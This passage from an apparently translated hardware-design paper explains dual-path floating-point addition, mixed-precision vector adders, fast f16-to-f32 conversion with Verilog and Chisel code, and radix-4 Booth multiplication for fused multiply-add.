    &lt;p&gt;(7) Rounding (\(Round\)): Round according to the \(IEEE\)-\(754\) standard, adding \(1\) to the \(LSB\) of \(Sf\) if necessary. This step may cause overflow, requiring the mantissa result to be right-shifted by one bit while incrementing the exponent \(Ef\) by \(1\).&lt;/p&gt;
    &lt;head rend="h4"&gt;Dual-path floating-point addition algorithm&lt;/head&gt;
    &lt;p&gt;The above single-path floating-point algorithm is slow because the steps in the addition operation are essentially executed serially. This algorithm can be improved in the following ways:&lt;/p&gt;
    &lt;p&gt;(1) In the single-path floating-point addition algorithm, the \(Conv\) step is only needed when the result is negative, and it can be avoided by swapping the significands of the two operands. By checking the sign of the \(ES\) step result, the significands can be swapped (\(Swap\)) accordingly, always computing the larger significand minus the smaller one. When exponents are equal, the result may still be negative, requiring conversion, but no rounding is needed in this case. Thus, the swap step makes rounding and conversion mutually exclusive, allowing them to be parallelized. Note that another advantage of swapping is that only one shifter is required.&lt;/p&gt;
    &lt;p&gt;(2) The leading zero detection step can be executed in parallel with the significand addition step, removing it from the critical path. This optimization is particularly important in cases where subtraction requires significant left shifts.&lt;/p&gt;
    &lt;p&gt;(3) So far, the critical path steps have been reduced to: normalized exponent subtraction, swapping, alignment, significand addition \(||\) leading zero detection, conversion \(||\) rounding, normalization (where \(||\) denotes steps that can be executed in parallel). The alignment and normalization steps are mutually exclusive and can be further optimized. Normalization requires a large left shift only when \(d≤1\) or during equivalent subtraction. Conversely, alignment requires a large right shift only when \(d &amp;gt; 1\). By distinguishing these two cases, only one large shift—either alignment or normalization—remains on the critical path.&lt;/p&gt;
    &lt;p&gt;The steps for single-path and dual-path floating-point addition algorithms are shown in the table. In the dual-path algorithm, the preprocessing step (\(Pred\)) in the \(d ≤ 1\) path determines whether a right shift is needed to align significands based on the value of \(d\). The dual-path algorithm improves speed by executing more steps in parallel, requiring additional hardware for implementation.&lt;/p&gt;
    &lt;p&gt;Table: Steps for Two Floating-Point Addition Algorithms&lt;/p&gt;
    &lt;p&gt;+------------------+-----------------------------------------------------+ | Single-Path Floating-Point Addition | Dual-Path Floating-Point Addition Algorithm | | +-----------------------------+-----------------------+ | | \(d\leq1\) and Equivalent Subtraction | \(d&amp;gt;1\) or Equivalent Addition | +:================:+:===========================:+:=====================:+ | Normalized Exponent Addition | Preprocessing + Swap | Normalized Exponent Subtraction + Swap | +------------------+-----------------------------+-----------------------+ | Alignment | -- | Alignment | +------------------+-----------------------------+-----------------------+ | Significant Digit Addition | Significant Digit Addition or Leading Zero Detection | Significant Digit Addition | +------------------+-----------------------------+-----------------------+ | Conversion | Conversion or Rounding | Rounding | +------------------+-----------------------------+-----------------------+ | Leading Zero Detection | -- | -- | +------------------+-----------------------------+-----------------------+ | Normalization | Normalization | -- | +------------------+-----------------------------+-----------------------+ | Rounding | Path Selection | Path Selection | +------------------+-----------------------------+-----------------------+&lt;/p&gt;
    &lt;p&gt;In the dual-path floating-point addition algorithm, during the \(SA\) step in the case of equivalent subtraction, one of the significant digits is in 2's complement form. The complementation step and the rounding step are mutually exclusive, thus they can be performed in parallel. The optimized dual-path floating-point addition algorithm is shown in the table.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;\(d≤1\) and equivalent subtraction&lt;/cell&gt;
        &lt;cell role="head"&gt;\(d&amp;gt;1\) or equivalent addition&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Preprocessing + Exchange&lt;/cell&gt;
        &lt;cell&gt;Normalized Instruction Subtraction + Swap&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Significant Digit Addition Conversion&lt;/cell&gt;
        &lt;cell&gt;Rounding&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Normalization&lt;/cell&gt;
        &lt;cell&gt;Significand addition&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Selection Path&lt;/cell&gt;
        &lt;cell&gt;Selection Path&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;In the IEEE round-to-nearest (\(RTN\)) mode, computing \(A+B\) and \(A+B+1\) suffices to address all normalization possibilities (additional computation of \(A+B+2\) is required for rounding toward positive or negative infinity). By utilizing \(Cin\) to select the final rounded mantissa result from multiple sets of significand adder outputs, both two's complement conversion and rounding can be completed simultaneously, saving an addition step. Since floating-point addition may require normalization through a right shift by one bit, no shift, or a left shift (potentially as extensive as the significand's length), \(Cin\) must account for all these normalization possibilities to ensure the selected result is the rounded one.&lt;/p&gt;
    &lt;head rend="h4"&gt;Improved dual-path floating-point addition algorithm&lt;/head&gt;
    &lt;p&gt;This section details the improved dual-path floating-point addition algorithm proposed in this paper. The path for equivalent addition or equivalent subtraction with d &amp;gt; 1 is called the far path, while the path for equivalent subtraction with d ≤ 1 is called the close path. Cases involving infinity or NaN operands are handled separately and do not belong to the far or close paths.&lt;/p&gt;
    &lt;head rend="h5"&gt;\(far\) path&lt;/head&gt;
    &lt;p&gt;The \(far\) path algorithm is illustrated in the figure, with the main steps as follows:&lt;/p&gt;
    &lt;p&gt;Step 1: In the \(far\) path, when the exponent difference \(d\) is greater than \(1\), the smaller significand is shifted right by \(d\) bits to align with the larger significand. First, calculate the normalized exponent difference. To accelerate computation, two adders are used to compute the normalized exponent difference while comparing the magnitudes of \(Efp\_a\) and \(Efp\_b\). The correct normalized exponent difference is selected based on the comparison result of the exponent magnitudes.&lt;/p&gt;
    &lt;p&gt;In the second step, based on the exponent comparison from the first step, the significand of the operand with the larger exponent and the significand of the operand with the smaller exponent can be selected in parallel while also selecting the larger exponent \(EA\). For equivalent subtraction, \(EA\) is decremented by \(1\) (in this case, \(EA\) cannot be \(0\), as that would fall under the \(close\) path). This adjustment aims to align the value range of the significand after subtraction with that of equivalent addition, facilitating the selection of the final result. The adjusted significand addition or subtraction result falls within the range \([1\)-\(4)\), divided into two cases: \([1\)-\(2)\) and \([2\)-\(4)\).&lt;/p&gt;
    &lt;p&gt;Step three involves right-shifting the smaller significand, which is divided into two scenarios: during equivalent subtraction, the smaller significand is first inverted and then arithmetically right-shifted, saving some time compared to right-shifting first and then inverting; during equivalent addition, a logical right shift is directly applied. To reduce the number of shifter stages, when the high-order bits of the normalized exponent difference are all \(0\), the lower bits (the specific number depends on the significand width) are used for the right shift. If the high-order bits are not all \(0\), the right-shift result is \(0\). Here, the adder result from the first step, which calculates the normalized exponent difference between the two, is used, with the least significant bit applied first (since the adder result's least significant bit is obtained earliest). Specifically: if \(fp\_a\)'s exponent is larger, only \(fp\_b\)'s significand is right-shifted by the value of \(fp\_a\)'s normalized exponent minus \(fp\_b\)'s normalized exponent; if \(fp\_b\)'s exponent is larger, only \(fp\_a\)'s significand is right-shifted by the value of \(fp\_b\)'s normalized exponent minus \(fp\_a\)'s normalized exponent. The final right-shifted significand is then selected based on the exponent magnitude relationship and the normalized exponent difference, and the \(grs\) (\(guard\), \(round\), \(sticky\)) bits after the shift are calculated. To ensure correct rounding for the two scenarios in step two, two sets of \(grs\) need to be computed for the significand addition/subtraction results within \([1\)-\(2)\) and \([2\)-\(4)\).&lt;/p&gt;
    &lt;p&gt;Step 4: Perform significand addition. For equivalent subtraction, the smaller significand is inverted before right-shifting. Denote the larger significand as \(A\) and the right-shifted smaller significand as \(B\). Two adders compute \(A+B\) and \(A+B+2\), and the final rounded result is selected from these two adder outputs.&lt;/p&gt;
    &lt;p&gt;Step five: generate the final result. Depending on whether the significant digits \(A+B\) result falls within \([1\)-\(2)\) (case one) or \([2\)-\(4)\) (case two), and based on the two sets of \(grs\) and rounding modes calculated during the previous right shift, determine the conditions for selecting the two significant digit adders in case one and case two, respectively. Finally, use a one-hot four-way selection to choose the mantissa result. The exponent result is either \(EA\) (case one and mantissa rounded to \(&amp;lt;1\)) or \(EA+1\) (case two or case one rounded to \(=2\)). Note whether the exponent overflows after rounding, and the final result is selected between the overflow result and the normal computation result based on \(overflow\). The exception flags in the \(far\) path only produce overflow and inexact results.&lt;/p&gt;
    &lt;head rend="h5"&gt;\(close\) path&lt;/head&gt;
    &lt;p&gt;In the \(close\) path, it must be an effective subtraction with \(d \leq 1\), specifically categorized as \(d=0\) or \(d=1\). The algorithm is illustrated in the figure, with the following detailed steps:&lt;/p&gt;
    &lt;p&gt;Step 1: Perform four sets of significand subtractions in parallel. Based on \(d=0\) (\(fp\_a\) significand is larger, \(fp\_b\) significand is larger) and \(d=1\) (\(fp\_a\) normalized exponent is larger, \(fp\_b\) normalized exponent is larger), combine the four scenarios for effective subtraction. The first subtractor: \(fp\_a\) significand \(-\) \(fp\_b\) significand; the second subtractor: \(fp\_b\) significand \(-\) \(fp\_a\) significand; the third subtractor: \(fp\_a\) significand \(×2\) \(-\) \(fp\_b\) significand; the fourth subtractor: \(fp\_b\) significand \(×2\) \(-\) \(fp\_a\) significand. Simultaneously, calculate the \(grs\) bits based on the exponent magnitude relationship. When \(d=0\), all \(grs\) bits are \(0\); when \(d=1\), only \(g\) may be non-zero. These four sets of adders cannot produce all rounding results, so a fifth slower adder is added: the significand with the larger exponent \(–\) the significand with the smaller exponent shifted right by one bit.&lt;/p&gt;
    &lt;p&gt;Step two: Determine the four conditions for selecting the four sets of significand subtractions, based on the value of \(d\), the most significant bit of the adder result, \(grs\), and the rounding mode. After selecting the subtraction result from the four sets of adders, perform \(LZD\) \(+\) left shift on the subtraction result. Here, attention must be paid to the value of the larger exponent \(EA\). The left shift is controlled jointly by \(LZD\) and \(EA\), generating a \(mask\) value (with the same bit width as the subtraction result but with at most one bit set to \(1\)) based on the value of \(EA\). This \(mask\) is ORed with the subtraction result before performing \(LZD+\) left shift.&lt;/p&gt;
    &lt;p&gt;Step 3: Determine the condition for selecting the fifth subtractor. When selecting the result of the fifth subtractor, no left shift is required, so a slower adder is used, and the final mantissa result can then be selected.&lt;/p&gt;
    &lt;p&gt;Step four: exponent and sign bit results. The exponent result requires subtracting the \(LZD\) value from step two from \(EA\). If the fifth subtractor is selected as the mantissa result, the exponent remains unchanged. When \(d=1\), the sign bit is the sign of the operand with the larger exponent. When \(d=0\), the sign bit is selected based on the mantissa size. Note that when the result is \(0\) and rounded down, the sign bit is \(1\).&lt;/p&gt;
    &lt;head rend="h4"&gt;Vector floating-point addition algorithm&lt;/head&gt;
    &lt;p&gt;The vector floating-point adder's output signal width is \(64\) bits, supporting mixed precision and widening instructions. It must support calculations for the following data formats:&lt;/p&gt;
    &lt;p&gt;(1) \(1\) \(f64\) \(= f64 + f64\);&lt;/p&gt;
    &lt;p&gt;(2) \(1\) \(f64\) \(= f64 + f32\);&lt;/p&gt;
    &lt;p&gt;(3) 1 \(f64\) = \(f32\) + \(f32\);&lt;/p&gt;
    &lt;p&gt;(4) \(2\) \(f32\) values \(= f32 + f32\);&lt;/p&gt;
    &lt;p&gt;(5) \(2\) \(f32\) \(= f32 + f16\);&lt;/p&gt;
    &lt;p&gt;(6) Two \(f32\) \(= f16 + f16\);&lt;/p&gt;
    &lt;p&gt;(7) Four \(f16\) = \(f16 + f16\).&lt;/p&gt;
    &lt;head rend="h5"&gt;Module partitioning&lt;/head&gt;
    &lt;p&gt;The computation approach uses one module for the first three formats, all outputting 64-bit results. The single-precision floating-point adder for \(f64 = f64 + f64\) is reused to compute \(f64 = f64 + f32\) and \(f64 = f32 + f32\). This paper proposes a fast data format conversion algorithm to convert \(f32\) operands to \(f64\), enabling \(f64 = f64 + f64\) computation and yielding results in \(f64\) format.&lt;/p&gt;
    &lt;p&gt;The same approach is applied to computation formats where the output is \(f32\). Since \(f32\) has less timing pressure, integrating a \(f16 = f16 + f16\) operation into the module that computes \(f32\) results saves area while supporting:&lt;/p&gt;
    &lt;p&gt;(1) One \(f32 = f32 + f32\);&lt;/p&gt;
    &lt;p&gt;(2) One \(f32 = f32 + f16\);&lt;/p&gt;
    &lt;p&gt;(3) One \(f32 = f16 + f16\);&lt;/p&gt;
    &lt;p&gt;(4) One \(f16 = f16 + f16\).&lt;/p&gt;
    &lt;p&gt;Clearly, this module needs to be instantiated twice, and there are still two \(f16 = f16 + f16\) operations missing. Two single-precision floating-point adders dedicated to computing \(f16 = f16 + f16\) are instantiated separately, totaling four modules, to implement all vector addition calculation formats.&lt;/p&gt;
    &lt;head rend="h5"&gt;Fast format conversion algorithm&lt;/head&gt;
    &lt;p&gt;Taking the conversion from \(f16\) to \(f32\) as an example, a fast format conversion algorithm is introduced.&lt;/p&gt;
    &lt;p&gt;When \(f16\) is a normalized number, converting it to \(f32\) will also result in a normalized number. For \(f16\) exponents, they are biased to match \(f32\) exponents. Since \(f32\) has a larger exponent range, there is no concern about exponent overflow after conversion. Additionally, the \(f16\) significand is \(10\) bits, while the \(f32\) significand is \(23\) bits. Simply appending \(13\) zeros to the \(f16\) significand yields the \(f32\) significand. This is a conversion from lower to higher precision, ensuring the result is exact.&lt;/p&gt;
    &lt;p&gt;For a normalized \(f16\) exponent (5-bit width), the actual exponent \(Ereal = Ef16 – 15\). For a normalized \(f32\) exponent (8-bit width), \(Ereal = Ef32 – 127\). Thus, converting \(Ef16\) to \(Ef32\) via \(Ereal\): \(Ef16 – 15 = Ef32 – 127\), \(Ef32 = Ef16 – 15 + 127\), \(Ef32 = Ef16 + 112\). The 8-bit binary representation of \(112\) is \(01110000\). Computing \(Ef16 + 112\) requires an adder for a variable plus a constant, but this adder can be avoided by identifying the following pattern:&lt;/p&gt;
    &lt;p&gt;When the highest bit of \(Ef16\) is \(0\), \(Ef16 + 112 = (0111, Ef16(3, 0))\)&lt;/p&gt;
    &lt;p&gt;When the most significant bit of \(Ef16\) is \(1\), \(Ef16 + 112 = (1000, Ef16(3, 0))\).&lt;/p&gt;
    &lt;p&gt;Using this pattern, an \(Mux\) can quickly convert \(Ef16\) to \(Ef32\). Thus, for normalized \(f16\) to \(f32\) conversion, the exponent bits use an \(Mux\), the significand bits are padded with 0, and the sign bit remains unchanged. The challenge arises when \(f16\) is denormal. In this case, all exponent bits of \(f16\) are 0, and the number of leading zeros in the significand determines the exponent after conversion to \(f32\). When all exponent bits of \(f16\) are zero and only the \(lsb\) of the significand is 1, the converted \(f32\) exponent is minimized at \(-15-9=-24\), which still falls within the range of \(f32\) normalized numbers. Therefore, for denormal \(f16\), leading zero detection (\(lzd\)) and left shifting of the significand are required.&lt;/p&gt;
    &lt;p&gt;Chisel's built-in priority encoder can implement the \(lzd\) function. Tests show it synthesizes better than traditional \(lzd\) implementations using binary search. The syntax is: \(PriorityEncoder(Reverse(Cat(in,1.U)))\). For a \(5\)-bit \(in\), the generated Verilog code is as follows:&lt;/p&gt;
    &lt;code&gt;module LZDPriorityEncoder(
  input        clock,
  input        reset,
  input  [4:0] in,
  output [2:0] out
);
  wire [5:0] _out_T = {in,1'h1};
  wire [5:0] _out_T_15 = {_out_T[0],_out_T[1],_out_T[2],_out_T[3],_out_T[4],_out_T[5]};
  wire [2:0] _out_T_22 = _out_T_15[4] ? 3'h4 : 3'h5;
  wire [2:0] _out_T_23 = _out_T_15[3] ? 3'h3 : _out_T_22;
  wire [2:0] _out_T_24 = _out_T_15[2] ? 3'h2 : _out_T_23;
  wire [2:0] _out_T_25 = _out_T_15[1] ? 3'h1 : _out_T_24;
  assign out = _out_T_15[0] ? 3'h0 : _out_T_25;
endmodule
&lt;/code&gt;
    &lt;p&gt;Although this code appears to use many cascaded \(Mux\)es, the synthesizer produces good timing results for such code. Inspired by this, this paper designs a novel priority-based left-shift algorithm to accelerate \(lzd+\) left-shift, with the \(Chisel\) code as follows:&lt;/p&gt;
    &lt;code&gt;def shiftLeftPriorityWithF32EXPResult(srcValue: UInt, priorityShiftValue: UInt): UInt = {
  val width = srcValue.getWidth
  val lzdWidth = srcValue.getWidth.U.getWidth
  def do_shiftLeftPriority(srcValue: UInt, priorityShiftValue: UInt, i:Int): UInt = {
    if (i==0) Cat(
      Mux(
        priorityShiftValue(i),
        Cat(srcValue(0),0.U((width-1).W)),
        0.U(width.W)
      ),
      Mux(
        priorityShiftValue(i),
        "b01110000".U-(width-i-1).U(8.W),
        "b01110000".U-(width-i).U(8.W)
      )
    )
    else Mux(
      priorityShiftValue(i),
      if (i==width-1) Cat(srcValue(i,0),"b01110000".U-(width-i-1).U(8.W)) 
      else Cat(Cat(srcValue(i,0),0.U((width-1-i).W)), "b01110000".U-(width-i-1).U(8.W)),
      do_shiftLeftPriority(srcValue = srcValue, priorityShiftValue = priorityShiftValue, i = i - 1)
      )
    }
    do_shiftLeftPriority(srcValue = srcValue, priorityShiftValue = priorityShiftValue, i = width-1)
  }
&lt;/code&gt;
    &lt;p&gt;Both \(srcValue\) and \(priorityShiftValue\) pass the mantissa of \(f16\), starting from the most significant bit (MSB) of the mantissa. If the MSB is \(1\), the original value of \(srcValue\) is returned along with the corresponding exponent (the exponent is selected from multiple constants and depends on the position of the first \(1\) in the mantissa). If the MSB is \(0\), the next bit is checked for \(1\). If it is \(1\), \(srcValue\) is left-shifted by one bit and returned (no actual left shift is needed here since the high bits after shifting are not retained; truncation and zero-padding suffice), along with the corresponding exponent. This process continues iteratively. Thus, a priority left shifter simultaneously performs the \(lzd\) and left shift operations while also generating the corresponding \(Ef32\), eliminating the need to calculate the \(Ef32\) exponent based on \(lzd\). This enables a fast algorithm for converting \(f16\) denormal numbers to \(f32\). A similar algorithm is used for converting \(f32\) to \(f64\), which is not elaborated here.&lt;/p&gt;
    &lt;head rend="h3"&gt;Vector Floating-Point Fused Multiply-Add Algorithm&lt;/head&gt;
    &lt;p&gt;Floating-point fused multiply-add computation \(fpa × fp\_b + fp\_c\), where the intermediate multiplication \(fpa × fp\_b\) is performed as if without range and precision limitations, without rounding, and only rounded once to the target format at the end. FMA is typically implemented using a pipeline, with steps including multiplication, addition, normalization shift, and rounding. This chapter introduces the vector floating-point fused multiply-add algorithm, whose functionalities include:&lt;/p&gt;
    &lt;p&gt;(1) 1 \(fp64 = fp64 × fp64 + fp64\);&lt;/p&gt;
    &lt;p&gt;(2) \(2\) \(fp32 = fp32 × fp32 + fp32\);&lt;/p&gt;
    &lt;p&gt;(3) Four \(fp16 = fp16 × fp16 + fp16\);&lt;/p&gt;
    &lt;p&gt;(4) \(2\) \(fp32 = fp16 × fp16 + fp32\);&lt;/p&gt;
    &lt;p&gt;(5) \(1\) \(fp64 = fp32 × fp32 + fp64\).&lt;/p&gt;
    &lt;p&gt;(\(1\)) (\(2\)) (\(3\)) The source and destination operands are in the same floating-point format, while in (\(4\)) (\(5\)), the two multipliers have the same width, and the other addend and the result share the same width, which is twice that of the multipliers.&lt;/p&gt;
    &lt;head rend="h4"&gt;Scalar single-precision format algorithm&lt;/head&gt;
    &lt;p&gt;The computation flow first calculates the unrounded result of multiplying two floating-point numbers, then adds this unrounded product to a third number. The algorithm flowchart is illustrated, expressed by the formula \(fp\_result = fp\_a × fp\_b + fp\_c\), where \(Sa\), \(Sb\), and \(Sc\) are the significands of \(fp\_a\), \(fp\_b\), and \(fp\_c\) respectively, and \(Ea\), \(Eb\), and \(Ec\) are their exponents:&lt;/p&gt;
    &lt;p&gt;For ease of description below, some parameters are defined, with their meanings and values listed in the table:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;Parameters&lt;/cell&gt;
        &lt;cell role="head"&gt;\(f16\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(f32\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(f64\)&lt;/cell&gt;
        &lt;cell role="head"&gt;Meaning&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;\(significandWidth\)&lt;/cell&gt;
        &lt;cell&gt;\(11\)&lt;/cell&gt;
        &lt;cell&gt;\(24\)&lt;/cell&gt;
        &lt;cell&gt;\(53\)&lt;/cell&gt;
        &lt;cell&gt;Significant Digit Width&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;\(exponentWidth\)&lt;/cell&gt;
        &lt;cell&gt;\(5\)&lt;/cell&gt;
        &lt;cell&gt;\(8\)&lt;/cell&gt;
        &lt;cell&gt;\(11\)&lt;/cell&gt;
        &lt;cell&gt;Exponent width&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;\(rshiftBasic\)&lt;/cell&gt;
        &lt;cell&gt;\(14\)&lt;/cell&gt;
        &lt;cell&gt;\(27\)&lt;/cell&gt;
        &lt;cell&gt;\(56\)&lt;/cell&gt;
        &lt;cell&gt;Number of right shifts required to align \(fp\_c\)'s significand with the product significand&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(rshiftMax\)&lt;/cell&gt;
        &lt;cell&gt;\(37\)&lt;/cell&gt;
        &lt;cell&gt;\(76\)&lt;/cell&gt;
        &lt;cell&gt;\(163\)&lt;/cell&gt;
        &lt;cell&gt;\(fp\_c\) maximum right shift count for significant digits (beyond this value, \(g\) and \(r\) are both \(0\))&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;Unsigned Integer Multiplication&lt;/head&gt;
    &lt;p&gt;The rule for multiplying two floating-point numbers is to multiply the sign bits, add the exponent bits (not simply added, as bias must be considered), and multiply the significands (including the implicit bit and mantissa bits). The significand multiplication is essentially fixed-point multiplication, which follows the same principle as unsigned integer multiplication.&lt;/p&gt;
    &lt;p&gt;Binary vertical multiplication is the original multiplication algorithm, where an \(n\)-bit \(C=A×B\) vertical method is illustrated. This process generates \(n\) partial products, which are then added with staggered alignment.&lt;/p&gt;
    &lt;p&gt;The multiplication algorithm using the vertical method has significant latency. Optimization efforts for multiplication operations primarily focus on two aspects: reducing the number of partial products (e.g., \(Booth\) encoding) and minimizing the latency introduced by adders (e.g., \(CSA\) compression).&lt;/p&gt;
    &lt;p&gt;When computing the multiplication of two floating-point numbers, their significands are multiplied. Since significands are unsigned, unsigned integer multiplication suffices for this computation. There are many algorithms for implementing unsigned integer multiplication, and three of them are compared below.&lt;/p&gt;
    &lt;p&gt;Method 1: Directly use the multiplication symbol \(×\), letting the synthesis tool decide.&lt;/p&gt;
    &lt;p&gt;Method two: Use a vertical multiplication method similar to manual decimal multiplication. Multiplying two \(n\)-bit numbers generates \(n\) partial products, which are then compressed using \(CSA\) (to be introduced later) into two numbers for addition.&lt;/p&gt;
    &lt;p&gt;Method 3: Use \(Booth\) encoding to generate \((n+1)/2\) rounded-up partial products, then compress them into two numbers for addition using \(CSA\).&lt;/p&gt;
    &lt;p&gt;The data in the table are the results of multiplying two 53-bit unsigned integers (for f64) using the TSMC 7nm process library. The target frequency is 3GHz, with a theoretical cycle time of 333.33ps. However, considering clock uncertainty and process corner variations, a design margin is reserved for the backend, leaving approximately 280ps per cycle. Therefore, it is evident that multiplication cannot be completed within one cycle. In practice, additional time is required to determine the implicit bit, making it even more impossible to achieve 53-bit multiplication in a single cycle. Although Method 1 has a smaller area and shorter latency, it cannot be pipelined, leaving only Methods 2 or 3 as viable options. Method 3 offers shorter latency and a smaller area compared to Method 2, making it the chosen implementation for unsigned integer multiplication.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Algorithm&lt;/cell&gt;
        &lt;cell role="head"&gt;Delay (\(ps\))&lt;/cell&gt;
        &lt;cell role="head"&gt;Area (\(um²\))&lt;/cell&gt;
        &lt;cell role="head"&gt;Pipelining feasibility&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Method one&lt;/cell&gt;
        &lt;cell&gt;\(285.15\)&lt;/cell&gt;
        &lt;cell&gt;\(1458.95\)&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Method two&lt;/cell&gt;
        &lt;cell&gt;\(320.41\)&lt;/cell&gt;
        &lt;cell&gt;\(2426.34\)&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Method three&lt;/cell&gt;
        &lt;cell&gt;\(302.19\)&lt;/cell&gt;
        &lt;cell&gt;\(2042.46\)&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;\(Booth\) encoding&lt;/head&gt;
    &lt;p&gt;The purpose of Booth encoding is to reduce the number of partial products in a multiplier. Taking the binary unsigned integer multiplication C=A*B as an example, the Booth encoding algorithm is derived.&lt;/p&gt;
    &lt;p&gt;The following expression is a general form of unsigned binary integers. To facilitate subsequent transformations, a \(0\) is added at both the beginning and the end, leaving its value unchanged.&lt;/p&gt;
    &lt;p&gt;After equivalent transformation, adjacent two bits of \(1\) cancel out to \(0\). For consecutive \(1\)s, the least significant \(1\) becomes \(-1\), and the bit above the most significant \(1\) changes from \(0\) to \(1\), with all \(1\)s turning to \(0\). This transformation is known as Booth transformation. It simplifies sequences of three or more consecutive \(1\)s, with greater simplification for longer sequences. However, this transformation does not optimize hardware circuits because it does not guarantee any partial product will always be \(0\). Therefore, modified Booth encoding is typically used in circuit design to effectively reduce the number of partial products.&lt;/p&gt;
    &lt;p&gt;Perform an equivalent transformation again, but this time with additional constraints on \(n\). Assuming \(n\) is odd, a zero is still appended at the end, increasing the length to an even number. Then, a zero is prepended at the highest bit, making the total length \(n+2\). This is done to facilitate subsequent derivations.&lt;/p&gt;
    &lt;p&gt;After equivalent transformation, it can be observed that the number of terms in the polynomial expression becomes \((n+1)/2\) (when \(n\) is odd). If \(n\) is even, a zero needs to be appended at the end, and two zeros are prepended before the most significant bit, making the number of terms \(n/2+1\) (when \(n\) is even). Combining both odd and even cases, the number of terms in the polynomial expression is the ceiling of \((n+1)/2\). Starting from the LSB of the original binary number, groups of three bits are formed (the first group's least significant bit requires an additional appended bit \(0\), and the most significant bit is padded with one \(0\) if \(n\) is odd or two \(0\)s if \(n\) is even, ensuring the padded length is odd). Adjacent groups overlap by one bit (the highest bit of the lower group overlaps with the lowest bit of the higher group), forming new polynomial factors. This is the improved Booth encoding method.&lt;/p&gt;
    &lt;p&gt;When multiplying two binary numbers, modified Booth encoding of the multiplier can halve the number of partial products. Let the multiplicand be \(A\) and the multiplier be \(B\), with \(B_{2i+1}\), \(B_{2i}\), and \(B_{2i-1}\) representing three consecutive bits of \(X\), where \(i\) is a natural number \(N\). \(PP_i\) denotes the partial product for each \(i\). After applying modified Booth transformation to \(B\) and multiplying by \(A\), the Booth encoding and \(PP\) truth table are as shown.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;\(B_{2i+1}\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(B_{2i}\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(B_{2i-1}\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(PP_i\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(A\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(A\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(2A\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(-2A\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(-A\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(-A\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;By evaluating each consecutive three-bit segment of the multiplier, the corresponding partial product is derived, halving the number of partial products. This approach treats the multiplier as a quaternary number, hence termed radix-4 Booth encoding. Multiplication using radix-4 Booth encoding offers significant optimization over traditional methods, is straightforward to implement, and meets most application requirements.&lt;/p&gt;
